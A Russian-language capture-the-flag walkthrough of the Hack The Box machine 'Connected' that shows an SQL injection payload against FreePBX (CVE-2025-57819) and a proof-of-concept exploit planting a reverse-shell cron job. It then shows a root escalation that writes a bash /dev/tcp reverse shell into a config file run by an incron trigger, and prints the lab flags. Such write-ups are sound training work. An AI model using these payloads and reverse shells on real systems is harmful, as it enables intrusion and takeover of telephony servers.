Сегодня я покажу как я прохоидл машину "Connected" на платформе Hack The Box. Машина легкого уровня, в рамках 11 сезона

# Разведка

Начинаю с полного сканирования портов, пользоваться буду кастомным скриптом для сканирования портов, содержимое ниже

```bash
#!/bin/bash
ports=$(nmap -p- --min-rate=500 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A $1
```

Запускаю скрипт:

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ bash nmap.sh 10.10.00.01
```

Результат:

```text
Starting Nmap 7.99 ( https://nmap.org ) at XXXX-XX-XX 11:29 -0400
Nmap scan report for connected.htb (10.10.00.01)
Host is up (0.066s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: 404 Not Found
|_Requested resource was config.php
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-title: 400 Bad Request
```

---
Для посещения сайта добавьте доменное имя `connected.htb` в `/etc/hosts`
---

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ sudo nano /etc/hosts
```

И вношу в таком порядке:

```text
10.10.00.01 connected.htb
```

Зайдя на сайт, вижу версию `FreePBX 16.0.40.7` на главной странице, что наталкивается на мысль, что всё и будет крутиться вокруг этого сервиса, поэтому перечислять директории или поддомены пока что не буду.  
После небольшого поиска нахожу подходящий CVE для этой версии: `CVE-2025-57819`
https://nvd.nist.gov/vuln/detail/cve-2025-57819
Т.е ход мысли такой: Узнать версию -> поиск CVE на основе версии -> поиск эксплойта на основе CVE

---

# Проверка на SQLi

Делаю базовую проверку через `curl`, этот пейлоад я нашел в гугле, он должен быть применим к этой версии FreePBX

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ curl -i -k "http://connected.htb//admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

Ответ:

```text
HTTP/1.1 500 Internal Server Error
Date: Sun, 07 Jun 2026 15:27:10 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Set-Cookie: PHPSESSID=5nj0fmr6s7nulbqvco7fp7478m; expires=Tue, 07-Jul-2026 15:27:10 GMT; Max-Age=2592000; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Transfer-Encoding: chunked
Content-Type: application/json

{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser@localhost~'::","file":"\/var\/www\/html\/admin\/libraries\/utility.functions.php","line":123}}
```

В ответе видно `USER:freepbxuser@localhost`.  
Это подтверждает, что SQLi действительно присутствует, а значит `CVE-2025-57819` применима.

---

# Эксплуатация

Скачиваю эксплойт:

```text
┌──(jekawhitehat㉿kali)-[~]
└─$ git clone https://github.com/b4sh2/CVE-2025-57819-poc.git
```

Создаю виртуальное окружение и ставлю зависимости:

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ python3 -m venv venv && source venv/bin/activate

┌──(jekawhitehat㉿kali)-[~]
└─$ pip install requests urllib3
```

Запускаю эксплойт:

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ python3 exploit.py http://connected.htb -i tun0 -p 4444
```

Получаю shell (или по английски говоря "отскок ракушки"):

```text
[*] Listener address: 10.10.00.00:4444 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:4444
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jglswllx' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.10.00.01:57430 !
[+] Removed cron job 'jglswllx' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---
bash: no job control in this shell
```

После подключения вижу системный баннер FreePBX и получаю доступ как пользователь `asterisk`.

Проверяю текущего пользователя:

```bash
[asterisk@connected ~]$ whoami
```

Результат:

```text
asterisk
```

---

# Получение user.txt

Пользовательский флаг лежит рядом с текущим пользователем т.е по стандратному пути /home

```bash
ls
cat user.txt
```

Результат:

```text
15627fea7efc1cd013a48f3a3ded38fe
```

---

# Разведка на машине от юзера `asterisk` и подготовка к повышению привилегий

Проверяю `sudo`:

```bash
sudo -l
```

Ответ:

```text
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
```

Дальше запускаю перечисление с помощью `linpeas.sh` и отдельно руками смотрю на интересные места.

---

# Результаты linpeas

После анализа выделяю несколько вещей:

```text
CVE: CVE-2021-27365 | Name: linux-iscsi | Match data: pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y | Tags: RHEL=8 | Rank: 1 | Details: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.

CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded

CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

═╣ Kernel vulns found: 4
```

Также вижу потенциально интересный путь через `incron`.
Вот как гугл рассказывает про `incron` - Incron (сокращение от inotify cron) - это служба (демон) в Linux, которая запускает заданные команды в ответ на события в файловой системе (например, создание, удаление или изменение файла)

---

# Incron и триггеры на скрипты от имени root

Особенно выделяю следующую строку:

```text
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Это означает, что при изменении файла `/var/spool/asterisk/sysadmin/dahdi_restart` автоматически запускается `/usr/sbin/sysadmin_dahdi_restart`.

Если этот скрипт выполняется с повышенными правами, то это выглядит как хороший путь к root, и это довольно таки стандартный вектор в легких машинах htb

Также есть другие триггеры:

```text
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

---

# Не будет лишним проверить активные локальные сервисы, т.к я опасаюсь кроличьей норы

Дополнительно вижу локальные порты:

```text
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:4000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5038          0.0.0.0:*               LISTEN      1371/asterisk
```

Но основной интерес остаётся за `incron` триггером

---

# Эксплуатация incron

Пробую использовать файл `/var/spool/asterisk/sysadmin/dahdi_restart` как точку для запуска команды.

Сначала пытаюсь напрямую записать reverse shell, но ракушка ломается.  
После этого перехожу на более стабильный вариант через `echo`.

Слушатель поднимаю заранее на kali (локально):

```bash
┌──(jekawhitehat㉿kali)-[~]
└─$ nc -lvnp 4445
```
На атакуемой машине, в файл, который будет обработан системой, добавляю запуск reverse shell:

```bash
[asterisk@connected ~]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.00.00/4445 0>&1" &' >> /etc/dahdi/init.conf
```

И пишу триггер:

```bash
[asterisk@connected ~]$ echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```



После этого получаю reverse shell (я люблю писать в этом  случае "отскок ракушки" - т.к это обычно прямой перевод с английского)

---

# Получаю root доступ и флаг root

На kali появляется соединение:

```text
connect to [10.10.00.00] from (UNKNOWN) [10.10.00.01] 57688
bash: no job control in this shell
```

Проверяю пользователя:

```bash
[asterisk@connected ~]$ whoami
```
root

Читаю root flag:

```bash
cat /root/root.txt
```

```text
06e50c60c40d0b119b6a2eafeaf52fd2
```


